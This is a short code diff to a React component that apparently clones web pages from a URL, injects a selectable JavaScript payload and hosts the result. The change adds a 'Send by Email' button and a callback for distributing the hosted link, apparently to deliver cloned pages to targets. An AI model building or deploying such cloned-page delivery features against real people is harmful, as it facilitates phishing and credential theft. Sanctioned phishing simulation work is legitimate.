@@ -12,7 +12,7 @@ import { Input } from '@/components/ui/input';
 import { Textarea } from '@/components/ui/textarea';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
-import { Loader2, Wand, Share2, Clipboard, Globe, Settings } from 'lucide-react';
+import { Loader2, Wand, Share2, Clipboard, Globe, Settings, Mail } from 'lucide-react';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
 import { useAuth } from '@/hooks/use-auth';
 import { logActivity } from '@/services/activity-log-service';
@@ -80,9 +80,10 @@ const defaultJsPayload = `
 
 type AdvancedPageClonerProps = {
   selectedPayload: JsPayload | null;
+  onLinkGenerated: (url: string) => void;
 }
 
-export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps) {
+export function AdvancedPageCloner({ selectedPayload, onLinkGenerated }: AdvancedPageClonerProps) {
   const { toast } = useToast();
   const { user } = useAuth();
   
@@ -281,6 +282,9 @@ export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps)
                             <Link href={hostedUrl} target="_blank" rel="noopener noreferrer"><Globe className="h-4 w-4" /></Link>
                         </Button>
                     </div>
+                     <Button className="w-full" onClick={() => onLinkGenerated(hostedUrl)}>
+                        <Mail className="mr-2 h-4 w-4"/> Send by Email
+                    </Button>
                     <div className="flex justify-center pt-4">
                          <QrCodeGenerator url={hostedUrl} />
                     </div>
